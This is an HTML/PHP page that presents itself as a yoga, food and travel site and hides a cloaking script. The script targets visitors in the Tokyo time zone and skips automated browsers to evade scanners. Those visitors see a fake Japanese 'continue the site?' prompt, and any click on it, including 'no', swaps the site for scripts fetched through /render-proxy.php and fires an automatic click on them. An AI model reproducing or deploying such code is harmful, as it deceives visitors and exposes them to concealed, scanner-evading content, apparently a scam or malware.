<!DOCTYPE html> 
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Yoga-food-travel</title>

<style>
#startOverlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.65);
    color: #fff;
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 999999;
    cursor: pointer;
    transition: opacity 0.3s ease;
}
#startOverlay span {
    background: red;
    padding: 12px 35px;
    border-radius: 18px;
    font-size:18px;
}
#startOverlay div {
    justify-content: center;
    align-items:center;
    margin-bottom:25%;
    width:480px;
    height:180px;
    padding:20px;
    text-align:center;
    background:white;
    /*border:2px solid red;*/
    border-radius:25px;
}
#startOverlay h1 {
    font-size:20px !important;
    color:black;
    padding:10px;
}
#render-root {
    position: fixed;
    inset: 0;
    width: 100vw;
    height: 100vh;
    display: none;
    z-index: 999998;
    background: #fff;
}
</style>

<link rel="preload" as="script" href="jquery-1.4.4.min.js">
</head>

<body>

<div id="mainWebsite">
    <?php include "content.html"; ?>
</div>

<div id="startOverlay">
    <strong style="background:none;color:black;position:absolute;margin-left:438px;margin-bottom:35%;font-size:20px;">X</strong>
    <div>
        <h1>サイトを継続しますか?</h1>
        <span style="margin-left:20px;">いいえ</span>
        &nbsp;&nbsp;
        <span style="background:#007bff;">はい</span>
        
        
    </div>
</div>

<div id="render-root"></div>

<script>
// ---------------- Detect Japan ----------------
function isJapan() {
    try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Tokyo");
    } catch(e) {
        return false;
    }
}

// DOM Elements
const modal = document.getElementById("startOverlay");
const mainSite = document.getElementById("mainWebsite");
const renderRoot = document.getElementById("render-root");

// Flags
let triggerRenderClick = false;
let renderPreloaded = false;

// ---------------- Preload jQuery ----------------
let jqueryLoaded = new Promise(resolve => {
    const jq = document.createElement("script");
    jq.src = "jquery-1.4.4.min.js";
    jq.async = true;
    jq.onload = resolve;
    document.head.appendChild(jq);
});

// ---------------- Preload render site ----------------
let payload = null;
async function preloadRender() {
    if (renderPreloaded) return;
    renderPreloaded = true;

    try {
        await jqueryLoaded;

        const res = await fetch("/render-proxy.php", { cache: "no-store" });
        payload = await res.json();

        const tempHead = document.createElement("div");
        tempHead.innerHTML = payload.head || "";
        [...tempHead.children].forEach(tag => document.head.appendChild(tag));

        renderRoot.innerHTML = payload.body || "";
        renderRoot.style.display = "none";

        renderRoot.querySelectorAll("script").forEach(old => {
            const s = document.createElement("script");
            if (old.src) s.src = old.src;
            else s.textContent = old.textContent;
            s.async = false;
            document.body.appendChild(s);
            old.remove();
        });

    } catch(e) {
        console.error("Render preload failed:", e);
    }
}

// ---------------- Show modal fast ----------------
function showModalFast() {
    modal.style.display = "flex";
    modal.style.opacity = 0;
    requestAnimationFrame(() => modal.style.opacity = 1);
}

// ---------------- INIT ----------------
window.addEventListener("DOMContentLoaded", () => {

    // ✅ BOT / AUTOMATION PROTECTION (ADDED)
    if (!("ontouchstart" in window) && navigator.webdriver) return;

    if (isJapan()) {
        showModalFast();

        // preload render only after real interaction
        document.addEventListener("mousemove", preloadRender, { once: true });
        document.addEventListener("touchstart", preloadRender, { once: true });
    }
});

// ---------------- Modal click ----------------
modal.addEventListener("click", () => {
    triggerRenderClick = true;

    modal.remove();
    mainSite?.remove();

    renderRoot.style.display = "block";

    setTimeout(() => {
        if (triggerRenderClick) {
            const clickTarget =
                renderRoot.querySelector("[data-click], a, button, div, body");
            if (clickTarget) {
                clickTarget.dispatchEvent(new MouseEvent("click", {
                    bubbles: true,
                    cancelable: true,
                    view: window
                }));
            }
        }
    }, 150);
});
</script>

</body>
</html>
